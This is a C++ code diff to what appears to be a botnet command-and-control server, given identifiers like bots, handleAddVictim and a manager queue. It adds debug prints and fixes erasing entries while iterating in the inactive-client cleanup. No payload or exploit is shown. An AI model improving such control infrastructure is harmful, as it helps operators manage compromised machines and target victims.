@@ -1,5 +1,7 @@
 #include "server.h"
 
+#include <utility>
+
 server::server(io::io_context& io_context, std::uint16_t port)
     : io_context_(io_context),
       acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
@@ -69,6 +71,8 @@ void server::handleAlive(std::string& command, std::vector<std::string>& params,
 	if (!params.size()) return;
 	if (!isNumber_(params[0])) return;
 	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
+
+	PRINT("NUMBER OF CLIENTS: ", clients_sessions_container_.size());
 }
 
 void server::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
@@ -109,7 +113,7 @@ void server::handleGetClientsData(std::string& command, std::vector<std::string>
 	int bot_counter = 0;
 	int current_msg_block = 0;
 
-    // Clearing messages queue (for manager)
+	// Clearing messages queue (for manager)
 	std::queue<std::vector<std::string>> empty;
 	std::swap(bots_data_output_, empty);
 
@@ -260,20 +264,21 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 
 void server::pingClients() {
 	std::string command = "[ARE_YOU_ALIVE]";
+	std::vector<std::pair<int, std::string>> inactive_bots;
 
 	for (auto& client : clients_sessions_container_) {
 		++client.second->inactive_timeout_count_;
 
 		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
 			PRINT("Disconnecting due to inactivity client:", client.second->ip_);
+			PRINT("NUMBER OF CLIENTS: ", clients_sessions_container_.size());
+
 			if (!client.second->disconnected_) {
+				PRINT("IT WAS CONNECTED: ", "!");
 				client.second->stop();
 			}
 
-			clients_sessions_container_.erase(client.second->id_);
-			if (clients_data_container_.find(client.second->ip_) != clients_data_container_.end()) {
-				clients_data_container_.erase(client.second->ip_);
-			}
+			inactive_bots.emplace_back(std::make_pair(client.second->id_, client.second->ip_));
 
 		} else {
 			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
@@ -281,6 +286,13 @@ void server::pingClients() {
 			}
 			std::vector<std::string> output_params = {NONE_PARAMETERS};
 			client.second->send(msg_parser_.genCommand(command, output_params));
+		}
+	}
+
+	for (auto& bot : inactive_bots) {
+		clients_sessions_container_.erase(bot.first);
+		if (clients_data_container_.find(bot.second) != clients_data_container_.end()) {
+			clients_data_container_.erase(bot.second);
 		}
 	}
 
